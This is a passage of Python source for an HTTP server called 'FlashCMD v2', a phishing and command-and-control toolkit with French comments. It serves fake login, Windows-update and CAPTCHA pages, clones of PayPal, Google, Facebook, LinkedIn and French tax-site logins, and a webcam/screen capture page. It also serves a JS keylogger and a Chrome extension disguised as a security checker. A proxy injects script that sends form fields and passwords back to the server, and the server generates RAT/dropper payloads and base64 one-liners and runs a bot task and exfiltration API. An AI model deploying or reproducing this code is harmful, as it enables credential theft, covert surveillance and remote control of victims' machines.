    "\\nLog         : "+BASE+"/c2/tracking";
}}
</script>
</body></html>"""

# ══════════════════════════════════════════════════════════════
# REQUEST HANDLER
# ══════════════════════════════════════════════════════════════

class Handler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        pass

    def _ip(self):
        xff = self.headers.get("X-Forwarded-For")
        return xff.split(",")[0].strip() if xff else self.client_address[0]

    def _parse_body(self) -> dict:
        length = int(self.headers.get("Content-Length", 0))
        if not length:
            return {}
        body = self.rfile.read(length).decode("utf-8", "ignore")
        try:
            return json.loads(body)
        except Exception:
            return dict(urllib.parse.parse_qsl(body))

    def _send(self, code: int, ctype: str, body):
        if isinstance(body, str):
            body = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", len(body))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def _redirect(self, url: str, code: int = 302):
        self.send_response(code)
        self.send_header("Location", url)
        self.end_headers()

    def _inject(self, html: str) -> bytes:
        """Remplacer les placeholders par les vraies valeurs."""
        html = html.replace("FILL_SERVER",   SERVER_IP)
        html = html.replace("FILL_PORT",     str(PORT))
        html = html.replace("FILL_C2_HOST",  SERVER_IP)
        return html.encode("utf-8")

    def _serve_file(self, path: pathlib.Path, ctype="text/html"):
        """Servir un fichier depuis le disque avec injection."""
        if not path.exists():
            self._send(404, "text/plain", b"404")
            return
        content = path.read_text(encoding="utf-8", errors="replace")
        content = content.replace("FILL_SERVER",   SERVER_IP)
        content = content.replace("FILL_PORT",     str(PORT))
        content = content.replace("FILL_C2_HOST",  SERVER_IP)
        self._send(200, ctype, content.encode("utf-8"))

    # ══════════════════════════════════════════════════════════
    # GET
    # ══════════════════════════════════════════════════════════
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path   = parsed.path.rstrip("/") or "/"
        qs     = dict(urllib.parse.parse_qsl(parsed.query))
        ip     = self._ip()
        ua     = self.headers.get("User-Agent", "")

        log({"type": "GET", "ip": ip, "path": path,
             "ua": ua[:100], "detail": path})

        # ── pages piège inline ────────────────────────────────
        if path in ("/", "/index"):
            self._send(200, "text/html",
                       self._inject(page_index()))

        elif path == "/update":
            self._send(200, "text/html",
                       self._inject(page_update()))

        elif path == "/captcha":
            self._send(200, "text/html",
                       self._inject(page_captcha()))

        elif path == "/surveillance":
            self._send(200, "text/html",
                       self._inject(page_surveillance()))

        elif path == "/keylog_page":
            self._send(200, "text/html",
                       self._inject(page_keylogger_js()))

        elif path == "/extension":
            self._send(200, "text/html",
                       self._inject(page_extension_install()))

        elif path == "/admin":
            self._send(200, "text/html",
                       self._inject(page_admin()))

        # ── pages depuis disque (clones + assets) ────────────
        elif path.startswith("/clone/"):
            name = path.split("/clone/")[1]
            self._serve_file(PAGE_DIR / f"clone_{name}.html")

        elif path.startswith("/assets_"):
            file_path = PAGE_DIR / path.lstrip("/")
            if file_path.exists():
                ext = file_path.suffix.lower()
                ctypes_map = {
                    ".css": "text/css",
                    ".js":  "application/javascript",
                    ".png": "image/png",
                    ".jpg": "image/jpeg",
                    ".svg": "image/svg+xml",
                    ".woff2": "font/woff2",
                    ".woff":  "font/woff",
                    ".ttf":   "font/ttf",
                    ".ico":   "image/x-icon",
                    ".gif":   "image/gif",
                    ".webp":  "image/webp",
                }
                ct = ctypes_map.get(ext, "application/octet-stream")
                self._send(200, ct, file_path.read_bytes())
            else:
                self._send(404, "text/plain", b"asset not found")

        # ── C2 dashboard depuis disque ────────────────────────
        elif path == "/c2":
            self._serve_file(pathlib.Path("c2") / "dashboard.html")

        # ── URL PIÉGÉE ────────────────────────────────────────
        elif path == "/go":
            target = qs.get("url", "")
            if not target:
                self._send(400, "text/plain", b"?url= requis")
                return
            entry = {
                "ts":     datetime.datetime.now().isoformat(),
                "ip":     ip,
                "ua":     ua,
                "target": target,
                "ref":    self.headers.get("Referer", ""),
                "page":   "trapped_url",
            }
            with open(CREDS_FILE, "a") as f:
                f.write(json.dumps(entry) + "\n")
            log({"type": "TRAPPED_URL", "ip": ip,
                 "detail": f"→ {target}"})
            html = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Chargement…</title>
<style>body{{background:#fff;margin:0}}
.l{{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
    font-family:Arial;color:#666;font-size:14px}}</style>
</head><body><div class="l">Chargement…</div>
<script>
(function(){{
  var d={{page:"trapped_url",target:{json.dumps(target)},
    ua:navigator.userAgent,lang:navigator.language,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen:screen.width+"x"+screen.height,
    cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory}};
  try{{
    var pc=new RTCPeerConnection({{iceServers:[]}});
    pc.createDataChannel("");
    pc.createOffer().then(function(o){{pc.setLocalDescription(o)}});
    pc.onicecandidate=function(e){{
      if(e.candidate){{
        var m=e.candidate.candidate.match(/\\d+\\.\\d+\\.\\d+\\.\\d+/);
        if(m)d.local_ip=m[0];
      }}
    }};
  }}catch(e){{}}
  if(navigator.getBattery){{
    navigator.getBattery().then(function(b){{
      d.battery={{level:b.level,charging:b.charging}};
    }});
  }}
  setTimeout(function(){{
    fetch("http://{SERVER_IP}:{PORT}/collect",{{
      method:"POST",headers:{{"Content-Type":"application/json"}},
      body:JSON.stringify(d)
    }}).finally(function(){{window.location.href={json.dumps(target)};}});
  }},300);
}})();
</script></body></html>"""
            self._send(200, "text/html", html.encode())

        # ── SHORTLINK ─────────────────────────────────────────
        elif path == "/shorten":
            target  = qs.get("url", "")
            if not target:
                self._send(400, "text/plain", b"?url= requis")
                return
            trap    = (f"http://{SERVER_IP}:{PORT}/go?"
                       f"url={urllib.parse.quote(target)}")
            code    = make_short(trap)
            short   = f"http://{SERVER_IP}:{PORT}/s/{code}"
            result  = {
                "original":  target,
                "trapped":   trap,
                "shortlink": short,
                "qr": (f"http://{SERVER_IP}:{PORT}/qr?"
                        f"url={urllib.parse.quote(target)}"),
            }
            accept = self.headers.get("Accept", "")
            if "text/html" in accept:
                html = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Lien généré</title>
<style>
body{{background:#0a0a0f;color:#e0e0e0;font-family:monospace;
     padding:40px;max-width:700px;margin:0 auto}}
h1{{color:#e63946;margin-bottom:24px}}
.box{{background:#12121a;border:1px solid #2a2a3a;border-radius:6px;
      padding:16px;margin-bottom:12px}}
.lbl{{color:#666;font-size:11px;text-transform:uppercase;margin-bottom:4px}}
.url{{color:#2ecc71;word-break:break-all;font-size:13px}}
.cp{{background:#e63946;border:none;color:#fff;padding:6px 12px;
     border-radius:4px;cursor:pointer;font-size:12px;margin-top:8px}}
</style></head><body>
<h1>⚡ Lien piégé généré</h1>
<div class="box">
  <div class="lbl">Lien court piégé (à partager)</div>
  <div class="url">{short}</div>
  <button class="cp"
    onclick="navigator.clipboard.writeText('{short}')">📋 Copier</button>
</div>
<div class="box">
  <div class="lbl">URL originale</div>
  <div class="url">{target}</div>
</div>
<div class="box">
  <div class="lbl">QR code piégé</div>
  <img src="/qr?url={urllib.parse.quote(target)}"
       style="border:1px solid #2a2a3a;margin-top:8px"
       width="200"><br>
  <a href="/qr?url={urllib.parse.quote(target)}"
     download="qr_piege.png"
     style="color:#3498db;font-size:12px">↓ Télécharger</a>
</div>
</body></html>"""
                self._send(200, "text/html", html.encode())
            else:
                self._send(200, "application/json",
                           json.dumps(result, indent=2).encode())

        elif path.startswith("/s/"):
            code   = path.split("/s/")[1]
            target = shortlinks.get(code, "")
            if target:
                log({"type": "SHORTLINK", "ip": ip,
                     "detail": f"{code} → {target}"})
                entry = {
                    "ts":        datetime.datetime.now().isoformat(),
                    "ip":        ip,
                    "ua":        ua,
                    "shortlink": code,
                    "target":    target,
                    "page":      "shortlink",
                }
                with open(CREDS_FILE, "a") as f:
                    f.write(json.dumps(entry) + "\n")
                self._redirect(target)
            else:
                self._send(404, "text/plain", "Lien expiré")

        # ── QR CODE ───────────────────────────────────────────
        elif path == "/qr":
            target   = qs.get("url",
                               f"http://{SERVER_IP}:{PORT}/")
            trap_url = (f"http://{SERVER_IP}:{PORT}/go?"
                        f"url={urllib.parse.quote(target)}")
            png = make_qr(trap_url)
            if png:
                self._send(200, "image/png", png)
            else:
                self._send(200, "text/plain",
                           f"pip install qrcode pillow\n\n"
                           f"URL piégée : {trap_url}".encode())

        # ── PIXEL TRACKING ────────────────────────────────────
        elif path.startswith("/track/"):
            track_id = path.split("/track/")[1]
            entry = {
                "ts":   datetime.datetime.now().isoformat(),
                "type": "PIXEL_TRACK",
                "id":   track_id,
                "ip":   ip,
                "ua":   ua,
                "ref":  self.headers.get("Referer", ""),
            }
            with open(TRACK_FILE, "a") as f:
                f.write(json.dumps(entry) + "\n")
            log({"type": "PIXEL_OPEN", "ip": ip,
                 "detail": f"id={track_id}"})
            self._send(200, "image/gif", PIXEL_GIF)

        # ── PROXY TRANSPARENT ─────────────────────────────────
        elif path == "/proxy":
            target = qs.get("url", "")
            if not target:
                self._send(400, "text/plain", b"?url= requis")
                return
            if not HAS_REQUESTS:
                self._send(500, "text/plain",
                           b"pip install requests requis")
                return
            log({"type": "PROXY", "ip": ip, "detail": target})
            try:
                r = req_lib.get(
                    target,
                    headers={"User-Agent": ua},
                    timeout=15, verify=False,
                )
                ct = r.headers.get("Content-Type", "text/html")
                if "text/html" in ct:
                    body = r.text
                    collector = f"""<script>
(function(){{
  function col(d){{fetch("http://{SERVER_IP}:{PORT}/collect",{{
    method:"POST",headers:{{"Content-Type":"application/json"}},
    body:JSON.stringify(d)}})}}
  document.addEventListener("submit",function(e){{
    var fd=new FormData(e.target),d={{page:"proxy",
      target:{json.dumps(target)},ua:navigator.userAgent}};
    fd.forEach(function(v,k){{d[k]=v}});col(d);
  }},true);
  document.addEventListener("blur",function(e){{
    var el=e.target;
    if(el.type==="password"&&el.value)
      col({{event:"pw_blur",value:el.value,
            target:{json.dumps(target)}}});
  }},true);
  col({{page:"proxy_land",target:{json.dumps(target)},
        ua:navigator.userAgent}});
}})();
</script>"""
                    if "</body>" in body:
                        body = body.replace(
                            "</body>", collector + "</body>")
                    else:
                        body += collector
                    self._send(200, ct,
                               body.encode("utf-8", "replace"))
                else:
                    self._send(200, ct, r.content)
            except Exception as e:
                self._send(500, "text/plain",
                           f"Proxy error: {e}".encode())

        # ── PAYLOADS ──────────────────────────────────────────
        elif path == "/payload":
            name    = qs.get("name", "dropper") + ".py"
            c2_host = qs.get("c2",   SERVER_IP)
            c2_port = qs.get("port", str(PORT))
            payload = build_payload(name, c2_host, c2_port)
            log({"type": "PAYLOAD", "ip": ip, "detail": name})
            self._send(200, "text/plain", payload)

        elif path == "/oneliner":
            name    = qs.get("name", "rat") + ".py"
            c2_host = qs.get("c2",   SERVER_IP)
            c2_port = qs.get("port", str(PORT))
            payload = build_payload(name, c2_host, c2_port)
            line    = b64_oneliner(payload)
            log({"type": "ONELINER", "ip": ip, "detail": name})
            self._send(200, "text/plain", line.encode())

        # ── .EXE BUILDS ───────────────────────────────────────
        elif path.startswith("/builds/"):
            fname    = path.split("/builds/")[1]
            exe_path = pathlib.Path("builds") / fname
            if exe_path.exists() and exe_path.suffix in (
                ".exe", ".apk", ".py", ".zip"
            ):
                log({"type": "BUILD_DL", "ip": ip,
                     "detail": fname})
                self.send_response(200)
                self.send_header(
                    "Content-Type", "application/octet-stream")
                self.send_header(
                    "Content-Disposition",
                    f"attachment; filename={fname}")
                self.send_header(
                    "Content-Length",
                    exe_path.stat().st_size)
                self.end_headers()
                self.wfile.write(exe_path.read_bytes())
            else:
                self._send(404, "text/plain", b"404")

        # ── TÉLÉCHARGEMENT EXTENSION ZIP ──────────────────────
        elif path == "/download/extension":
            import zipfile
            buf     = io.BytesIO()
            ext_dir = pathlib.Path("extension")
            if ext_dir.exists():
                with zipfile.ZipFile(
                    buf, "w", zipfile.ZIP_DEFLATED
                ) as zf:
                    for f in ext_dir.rglob("*"):
                        if f.is_file():
                            if f.suffix in (
                                ".js", ".json", ".html"
                            ):
                                content = f.read_text(
                                    errors="replace"
                                )
                                content = content.replace(
                                    "FILL_SERVER", SERVER_IP)
                                content = content.replace(
                                    "FILL_PORT", str(PORT))
                                zf.writestr(
                                    str(f.relative_to(ext_dir)),
                                    content,
                                )
                            else:
                                zf.write(
                                    f,
                                    f.relative_to(ext_dir),
                                )
                data = buf.getvalue()
                self.send_response(200)
                self.send_header(
                    "Content-Type", "application/zip")
                self.send_header(
                    "Content-Disposition",
                    "attachment; filename=security_checker.zip")
                self.send_header("Content-Length", len(data))
                self.end_headers()
                self.wfile.write(data)
            else:
                self._send(404, "text/plain",
                           b"dossier extension/ manquant")

        # ── C2 API — lecture ──────────────────────────────────
        elif path == "/c2/bots":
            with bots_lock:
                self._send(200, "application/json",
                           json.dumps(bots).encode())

        elif path.startswith("/c2/task/"):
            bot_id = path.split("/")[-1]
            with bots_lock:
                b     = bots.get(bot_id, {})
                tasks = b.get("tasks", [])
                task  = tasks.pop(0) if tasks else ""
                if bot_id in bots:
                    bots[bot_id]["tasks"] = tasks
            self._send(200, "application/json",
                       json.dumps({"cmd": task}).encode())

        elif path == "/c2/creds":
            try:    data = open(CREDS_FILE).read()
            except: data = "(vide)"
            self._send(200, "text/plain", data.encode())

        elif path == "/c2/exfil":
            try:    data = open(EXFIL_FILE).read()
            except: data = "(vide)"
            self._send(200, "text/plain", data.encode())

        elif path == "/c2/visits":
            try:    data = open(LOG_FILE).read()
            except: data = "(vide)"
            self._send(200, "text/plain", data.encode())

        elif path == "/c2/tracking":
            try:    data = open(TRACK_FILE).read()
            except: data = "(vide)"
            self._send(200, "text/plain", data.encode())

        elif path == "/c2/keylog":
            try:    data = open(KEYLOG_FILE).read()
            except: data = "(vide)"
            self._send(200, "text/plain", data.encode())

        elif path == "/c2/frames":
            frames_dir = pathlib.Path("frames")
            result     = []
            if frames_dir.exists():
                for img in sorted(
                    frames_dir.rglob("*.jpg")
                )[-50:]:
                    result.append({
                        "url":  "/frame_img/" + str(
                            img.relative_to(frames_dir)
                        ),
                        "type": img.parent.parent.name,
                        "ip":   img.parent.name,
                        "ts":   img.stem,
                    })
            self._send(200, "application/json",
                       json.dumps({"frames": result}).encode())

        elif path.startswith("/frame_img/"):
            img_path = pathlib.Path("frames") / \
                       path.split("/frame_img/")[1]
            if img_path.exists():
                self._send(200, "image/jpeg",
                           img_path.read_bytes())
            else:
                self._send(404, "text/plain", b"404")

        else:
            self._send(404, "text/plain", b"404")

    # ══════════════════════════════════════════════════════════
    # POST
    # ══════════════════════════════════════════════════════════
    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path   = parsed.path.rstrip("/")
        ip     = self._ip()
        body   = self._parse_body()

        log({"type": "POST", "ip": ip, "path": path,
             "detail": str(body)[:150]})

        # ── collecte credentials / fingerprint ────────────────
        if path == "/collect":
            entry = {
                "ts": datetime.datetime.now().isoformat(),
                "ip": ip,
                **body,
            }
            with open(CREDS_FILE, "a") as f:
                f.write(json.dumps(entry) + "\n")
            if body.get("password") or body.get("pass"):
                log({"type":   "CREDS_HIT",
                     "ip":     ip,
                     "detail": (
                         f"{body.get('email', body.get('username','?'))}"
                         f" / "
                         f"{body.get('password', body.get('pass','?'))}"
                     )})
            self._redirect("https://microsoft.com")

        # ── intercepter soumission formulaire clone ───────────
        elif path.startswith("/proxy_submit/"):
            name  = path.split("/proxy_submit/")[1]
            entry = {
                "ts":    datetime.datetime.now().isoformat(),
                "ip":    ip,
                "clone": name,
                **body,
            }
            with open(CREDS_FILE, "a") as f:
                f.write(json.dumps(entry) + "\n")
            log({"type":   "CLONE_SUBMIT",
                 "ip":     ip,
                 "detail": f"{name} — {str(body)[:100]}"})
            origins = {
                "paypal":   "https://www.paypal.com",
                "google":   "https://accounts.google.com",
                "facebook": "https://facebook.com",
                "linkedin": "https://linkedin.com",
                "impots":   "https://www.impots.gouv.fr",
            }
            self._redirect(origins.get(name, "https://google.com"))

        # ── frames caméra / écran ─────────────────────────────
        elif path == "/frame":
            frame_type = body.get("type",  "unknown")
            frame_data = body.get("frame", "")
            ts         = body.get("ts",
                datetime.datetime.now().isoformat())
            frames_dir = pathlib.Path("frames") / frame_type / ip
            frames_dir.mkdir(parents=True, exist_ok=True)
            fname = ts.replace(
                ":", "-").replace(".", "-") + ".jpg"
            if frame_data.startswith("data:image"):
                raw = base64.b64decode(
                    frame_data.split(",")[1])
                (frames_dir / fname).write_bytes(raw)
            log({"type": f"FRAME_{frame_type.upper()}",
                 "ip":   ip,
                 "detail": fname})
            self._send(200, "application/json",
                       b'{"ok":true}')

        # ── keylog JS ─────────────────────────────────────────
        elif path == "/keylog":
            with open(KEYLOG_FILE, "a") as f:
                f.write(json.dumps({
                    "ts":   datetime.datetime.now().isoformat(),
                    "ip":   ip,
                    **body,
                }) + "\n")
            log({"type":   "KEYLOG",
                 "ip":     ip,
                 "detail": str(body)[:100]})
            self._send(200, "application/json",
                       b'{"ok":true}')

        # ── C2 register ───────────────────────────────────────
        elif path == "/c2/register":
            bot_id = body.get("id", ip)
            with bots_lock:
                if bot_id not in bots:
                    bots[bot_id] = {
                        "ip":         ip,
                        "os":         body.get("os",   "?"),
                        "user":       body.get("user", "?"),
                        "first_seen": datetime.datetime.now()
                                      .isoformat(),
                        "tasks":      [],
                        "results":    [],
                    }
                bots[bot_id]["last_seen"] = \
                    datetime.datetime.now().isoformat()
            self._send(200, "application/json",
                       b'{"ok":true}')

        # ── C2 result ─────────────────────────────────────────
        elif path.startswith("/c2/result/"):
            bot_id = path.split("/")[-1]
            result = body.get("result", "")
            with bots_lock:
                if bot_id not in bots:
                    bots[bot_id] = {
                        "ip":         ip,
                        "os":         "?",
                        "user":       "?",
                        "first_seen": datetime.datetime.now()
                                      .isoformat(),
                        "last_seen":  datetime.datetime.now()
                                      .isoformat(),
                        "tasks":      [],
                        "results":    [],
                    }
                bots[bot_id].setdefault(
                    "results", []).append({
                    "ts":     datetime.datetime.now().isoformat(),
                    "output": result,
                })
                bots[bot_id]["last_seen"] = \
                    datetime.datetime.now().isoformat()
            log({"type":   "BOT_RESULT",
                 "ip":     ip,
                 "detail": result[:150]})
            self._send(200, "application/json",
                       b'{"ok":true}')

        # ── C2 push task ──────────────────────────────────────
        elif path.startswith("/c2/push/"):
            bot_id = path.split("/")[-1]
            cmd    = body.get("cmd", "")
            with bots_lock:
                if bot_id not in bots:
                    bots[bot_id] = {
                        "ip":         ip,
                        "os":         "?",
                        "user":       "?",
                        "first_seen": datetime.datetime.now()
                                      .isoformat(),
                        "last_seen":  datetime.datetime.now()
                                      .isoformat(),
                        "tasks":      [],
                        "results":    [],
                    }
                bots[bot_id]["tasks"].append(cmd)
            self._send(200, "application/json",
                       b'{"ok":true}')

        # ── exfil data ────────────────────────────────────────
        elif path == "/exfil":
            with open(EXFIL_FILE, "a") as f:
                f.write(json.dumps({
                    "ts":   datetime.datetime.now().isoformat(),
                    "ip":   ip,
                    "data": body,
                }) + "\n")
            log({"type":   "EXFIL",
                 "ip":     ip,
                 "detail": str(body)[:200]})
            self._send(200, "application/json",
                       b'{"ok":true}')

        # ── extension Chrome — toutes les routes /ext/* ───────
        elif path.startswith("/ext/"):
            ext_type = path.split("/ext/")[1]
            log_file = f"ext_{ext_type}.log"
            with open(log_file, "a") as f:
                f.write(json.dumps({
                    "ts":   datetime.datetime.now().isoformat(),
                    "ip":   ip,
                    "type": ext_type,
                    **body,
                }) + "\n")
            if ext_type in (
                "form", "form_submit", "sensitive_field",
                "cookies", "field",
            ):
                log({"type":   f"EXT_{ext_type.upper()}",
                     "ip":     ip,
                     "detail": str(body)[:150]})
            self._send(200, "application/json",
                       b'{"ok":true}')

        else:
            self._send(404, "text/plain", b"404")

    # ── OPTIONS CORS ──────────────────────────────────────────
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header(
            "Access-Control-Allow-Origin",  "*")
        self.send_header(
            "Access-Control-Allow-Methods",
            "GET,POST,OPTIONS")
        self.send_header(
            "Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

# ══════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    srv = HTTPServer((HOST, PORT), Handler)
    print(f"\n{'='*58}")
    print(f"  FlashCMD v2 — http://{SERVER_IP}:{PORT}")
    print(f"{'='*58}")
    print(f"  Admin panel      : http://{SERVER_IP}:{PORT}/admin")
    print(f"  Phishing login   : http://{SERVER_IP}:{PORT}/")
    print(f"  Fausse MAJ Win   : http://{SERVER_IP}:{PORT}/update")
    print(f"  Faux CAPTCHA     : http://{SERVER_IP}:{PORT}/captcha")
    print(f"  Caméra + Écran   : http://{SERVER_IP}:{PORT}/surveillance")
    print(f"  Keylogger JS     : http://{SERVER_IP}:{PORT}/keylog_page")
    print(f"  Extension Chrome : http://{SERVER_IP}:{PORT}/extension")
    print(f"  Piéger URL       : http://{SERVER_IP}:{PORT}/go?url=<url>")
    print(f"  Shortlink        : http://{SERVER_IP}:{PORT}/shorten?url=<url>")
    print(f"  QR piégé         : http://{SERVER_IP}:{PORT}/qr?url=<url>")
    print(f"  Payload dropper  : http://{SERVER_IP}:{PORT}/payload?name=dropper")
    print(f"  C2 dashboard     : http://{SERVER_IP}:{PORT}/c2")
    print(f"  C2 creds         : http://{SERVER_IP}:{PORT}/c2/creds")
    print(f"  C2 bots          : http://{SERVER_IP}:{PORT}/c2/bots")
    print(f"  C2 frames        : http://{SERVER_IP}:{PORT}/c2/frames")
    print(f"{'='*58}\n")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")